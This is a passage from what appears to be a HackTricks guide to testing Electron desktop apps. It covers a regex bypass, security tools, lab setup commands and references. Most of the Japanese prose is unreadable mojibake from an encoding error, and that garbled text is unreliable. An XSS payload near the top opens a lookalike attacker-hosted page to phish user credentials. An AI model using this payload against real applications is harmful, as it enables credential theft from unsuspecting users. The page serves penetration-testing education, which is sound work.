é–¢æ•°ã§ä½¿ç”¨ã•ã‚Œã‚‹**regex**ãŒ**ãƒã‚¤ãƒ‘ã‚¹ã«å¯¾ã—ã¦è„†å¼±**ãªå ´åˆï¼ˆä¾‹ãˆã°ã€**ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒ‰ãƒƒãƒˆã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã—ãªã„**å ´åˆï¼‰ã€æ”»æ’ƒè€…ã¯XSSã‚’æ‚ªç”¨ã—ã¦ã€**æ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’é–‹ãã“ã¨ãŒã§ã**ã€ãã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã¯æ”»æ’ƒè€…ã®ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã«ä½ç½®ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«**è³‡æ ¼æƒ…å ±ã‚’è¦æ±‚**ã—ã¾ã™ï¼š
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **ãƒ„ãƒ¼ãƒ«**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) ã¯ã€Electronãƒ™ãƒ¼ã‚¹ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãŠã‘ã‚‹èª¤è¨­å®šã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ã‚¢ãƒ³ãƒãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) ã¯ã€Electronegativityã‚’ä½¿ç”¨ã™ã‚‹Electronã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ç”¨ã®ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã®VS Codeãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã§ã™ã€‚
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) ã¯ã€è„†å¼±ãªã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚
* [**Electro.ng**](https://electro.ng/): è³¼å…¥ãŒå¿…è¦ã§ã™ã€‚

## ãƒ©ãƒœ

[https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) ã§ã¯ã€è„†å¼±ãªElectronã‚¢ãƒ—ãƒªã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ãƒ©ãƒœã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ©ãƒœã«å½¹ç«‹ã¤ã„ãã¤ã‹ã®ã‚³ãƒãƒ³ãƒ‰:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **å‚è€ƒæ–‡çŒ®**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* Electronã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«é–¢ã™ã‚‹ã•ã‚‰ãªã‚‹ç ”ç©¶ã¨è¨˜äº‹ã¯[https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)ã§ç¢ºèªã§ãã¾ã™ã€‚
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
